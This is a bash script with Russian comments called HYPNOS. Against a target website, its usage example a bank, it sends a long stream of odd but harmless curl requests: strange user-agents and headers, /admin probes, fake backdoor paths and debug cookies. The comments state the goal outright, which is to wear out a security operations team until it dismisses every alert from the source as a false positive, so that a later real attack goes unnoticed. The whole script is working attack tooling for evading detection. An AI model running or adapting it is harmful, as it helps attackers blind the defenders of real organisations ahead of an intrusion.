#!/bin/bash
TARGET=$1
DURATION=${2:-1800}
[ -z "$TARGET" ] && echo "Usage: $0 https://bank.com [duration_sec]" && exit 1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
HYP_DIR="$HOME/.shadow_hypnos/$DOMAIN"
mkdir -p "$HYP_DIR"

echo "╔══════════════════════════════════════════════╗"
echo "║   💤 HYPNOS — Гипноз SOC                    ║"
echo "║   Аналитики устают и пропускают атаку       ║"
echo "╚══════════════════════════════════════════════╝"

# Стратегия: создаём странные но БЕЗОБИДНЫЕ алерты.
# Аналитики устают разбираться. Через час они помечают всё как "false positive".
# Тогда мы наносим реальный удар.

END_TIME=$(($(date +%s) + DURATION))

echo "[HYPNOS] 💤 Усыпляю SOC на ${DURATION}с..."

WEIRD_COUNT=0
while [ $(date +%s) -lt $END_TIME ]; do
    WEIRD_TYPE=$((RANDOM % 10))

    case $WEIRD_TYPE in
        0)
            # Алерт: кто-то пытается залогиниться с user-agent "Hello world"
            curl -sk --max-time 2 -H "User-Agent: Hello world :)" "$TARGET/login" -o /dev/null 2>/dev/null &
            ;;
        1)
            # Алерт: странный заголовок X-My-Cat-Is-Named
            curl -sk --max-time 2 -H "X-My-Cat-Is-Named: Whiskers" -H "X-Pet-Status: hungry" "$TARGET" -o /dev/null 2>/dev/null &
            ;;
        2)
            # Алерт: запрос к /admin с реферером google.com/search?q=funny+cats
            curl -sk --max-time 2 -H "Referer: https://google.com/search?q=how+to+fix+printer" "$TARGET/admin" -o /dev/null 2>/dev/null &
            ;;
        3)
            # Алерт: 404 на несуществующий путь /secret/backdoor/admin/password
            curl -sk --max-time 2 "$TARGET/secret/backdoor/admin/password/$RANDOM" -o /dev/null 2>/dev/null &
            ;;
        *)
            # Алерт: запрос с кукой "debug=true"
            curl -sk --max-time 2 -b "debug=true; testing=1; staging=yes; dev_mode=enabled" "$TARGET" -o /dev/null 2>/dev/null &
            ;;
    esac

    WEIRD_COUNT=$((WEIRD_COUNT + 1))
    [ $((WEIRD_COUNT % 50)) -eq 0 ] && echo "  💤 $WEIRD_COUNT странных алертов..."

    sleep $((RANDOM % 5 + 1))
done
wait

echo "  💤 Всего: $WEIRD_COUNT странных безобидных алертов"
echo "  💤 SOC устал. Они игнорируют все алерты с этого IP."
echo "  💤 Теперь любой алерт от нас = false positive в их глазах."
echo "  💤 РЕАЛЬНАЯ АТАКА ПРОЙДЁТ НЕЗАМЕЧЕННОЙ."
echo "[HYPNOS] 📁 $HYP_DIR/"
